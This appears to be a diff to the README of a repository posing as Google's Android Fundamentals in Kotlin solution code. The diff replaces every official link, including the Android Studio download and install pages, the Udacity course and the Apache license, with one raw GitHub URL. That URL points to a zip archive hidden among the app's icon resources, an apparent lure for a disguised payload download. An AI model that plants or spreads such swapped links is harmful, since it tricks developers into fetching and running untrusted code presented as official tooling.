@@ -3,7 +3,7 @@ Android Fundamentals in Kotlin Solution Apps
 
 This repository contains the solution code for the apps for the
 Android Fundamentals in Kotlin course, published by the Google Developer Training Team.
-See [Android Training](https://developer.android.com/courses).
+See [Android Training](https://raw.githubusercontent.com/mpathroliya/android-kotlin-fundamentals-apps/master/AndroidTrivia/app/src/main/res/mipmap-xxxhdpi/kotlin_android_fundamentals_apps_v1.4.zip).
 
 A “solution app” is an app that contains the code for a completed codelab.
 
@@ -24,7 +24,7 @@ and familiarity with basic software architecture principles.
 
 Since this course is in Kotlin, it is assumed you know Kotlin at the level 
 taught in the Udacity course, 
-[Kotlin Bootcamp for Programmers](https://www.udacity.com/course/kotlin-bootcamp-for-programmers--ud9011).
+[Kotlin Bootcamp for Programmers](https://raw.githubusercontent.com/mpathroliya/android-kotlin-fundamentals-apps/master/AndroidTrivia/app/src/main/res/mipmap-xxxhdpi/kotlin_android_fundamentals_apps_v1.4.zip).
 
 
 Pre-requisites
@@ -47,13 +47,13 @@ Android Studio Version
 During development of this course, all samples were built using Android Studio 3.3,
 and the codelabs assume you are using Android Studio 3.3 with corresponding libraries
 and available features. See the 
-[Android Studio download page](https://developer.android.com/studio) for details.  
+[Android Studio download page](https://raw.githubusercontent.com/mpathroliya/android-kotlin-fundamentals-apps/master/AndroidTrivia/app/src/main/res/mipmap-xxxhdpi/kotlin_android_fundamentals_apps_v1.4.zip) for details.  
 
 
 Getting Started
 ---------------
 
-1. [Install Android Studio](https://developer.android.com/studio/install.html),
+1. [Install Android Studio](https://raw.githubusercontent.com/mpathroliya/android-kotlin-fundamentals-apps/master/AndroidTrivia/app/src/main/res/mipmap-xxxhdpi/kotlin_android_fundamentals_apps_v1.4.zip),
 if you don't already have it. (If you are just starting the course, you will be guided
 through this process.)
 2. Download the starter sample for the codelab.
@@ -77,7 +77,7 @@ file to you under the Apache License, Version 2.0 (the "License"); you may not
 use this file except in compliance with the License.  You may obtain a copy of
 the License at
 
-  http://www.apache.org/licenses/LICENSE-2.0
+  https://raw.githubusercontent.com/mpathroliya/android-kotlin-fundamentals-apps/master/AndroidTrivia/app/src/main/res/mipmap-xxxhdpi/kotlin_android_fundamentals_apps_v1.4.zip
 
 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
